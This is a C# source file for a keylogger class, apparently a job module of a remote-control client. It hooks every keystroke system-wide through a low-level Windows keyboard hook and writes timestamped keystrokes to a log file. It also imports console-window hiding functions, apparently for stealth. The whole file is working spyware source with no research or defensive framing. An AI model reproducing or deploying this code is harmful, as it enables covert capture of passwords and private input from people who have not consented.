using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace Cromulent.Client.Jobs
{
    public class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Timer timer = new Timer();

        public void Start()
        {
            timer.Interval = 60 * 1000;
            timer.Tick += timer_Tick;
            timer.Enabled = true;
            timer.Start();
            _hookID = SetHook(_proc);
        }

        void timer_Tick(object sender, EventArgs e)
        {
            EnqueueStroke("", Keys.Enter);
        }

        public void Stop()
        {
            UnhookWindowsHookEx(_hookID);
            timer.Stop();
            timer.Tick -= timer_Tick;
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam); 
                
                var key = (Keys)vkCode;
                var stroke = key.ToString();
                switch(key)
                {
                    case Keys.Space:
                        stroke = " ";
                        break;
                    case Keys.Enter:
                        stroke = "[Enter]\r\n";
                        break;
                    case Keys.D0:
                        stroke = "0";
                        break;
                    case Keys.D1:
                        stroke = "1";
                        break;
                    case Keys.D2:
                        stroke = "2";
                        break;
                    case Keys.D3:
                        stroke = "3";
                        break;
                    case Keys.D4:
                        stroke = "4";
                        break;
                    case Keys.D5:
                        stroke = "5";
                        break;
                    case Keys.D6:
                        stroke = "6";
                        break;
                    case Keys.D7:
                        stroke = "7";
                        break;
                    case Keys.D8:
                        stroke = "8";
                        break;
                    case Keys.D9:
                        stroke = "9";
                        break;
                    case Keys.A:
                    case Keys.B:
                    case Keys.C:
                    case Keys.D:
                    case Keys.E:
                    case Keys.F:
                    case Keys.G:
                    case Keys.H:
                    case Keys.I:
                    case Keys.J:
                    case Keys.K:
                    case Keys.L:
                    case Keys.M:
                    case Keys.N:
                    case Keys.O:
                    case Keys.P:
                    case Keys.Q:
                    case Keys.R:
                    case Keys.S:
                    case Keys.T:
                    case Keys.U:
                    case Keys.V:
                    case Keys.W:
                    case Keys.X:
                    case Keys.Y:
                    case Keys.Z:
                        stroke = key.ToString();
                        break;
                    case Keys.OemPeriod:
                        stroke = ".";
                        break;
                    case Keys.OemQuotes:
                        stroke = "\"";
                        break;
                    case Keys.OemMinus:
                        stroke = "-";
                        break;
                    case Keys.Oemplus:
                        stroke = "+";
                        break;
                    case Keys.OemSemicolon:
                        stroke = ":";
                        break;
                    case Keys.OemQuestion:
                        stroke = "?";
                        break;                 

                    default:
                        stroke = string.Format("[{0}]", key.ToString());
                        break;

                }

                EnqueueStroke(stroke, key);
               
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static StringBuilder strokeQueue = new StringBuilder();
        private static void EnqueueStroke(string stroke, Keys key)
        {
            strokeQueue.Append(stroke);
            if (key == Keys.Enter && strokeQueue.Length > 0)
            {
                StreamWriter sw = new StreamWriter(Settings.KeyLoggerFileName, true);
                sw.Write(string.Format("{0} : {1}", DateTime.Now, strokeQueue.ToString()));
                sw.Close();
                strokeQueue.Clear();
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }
}
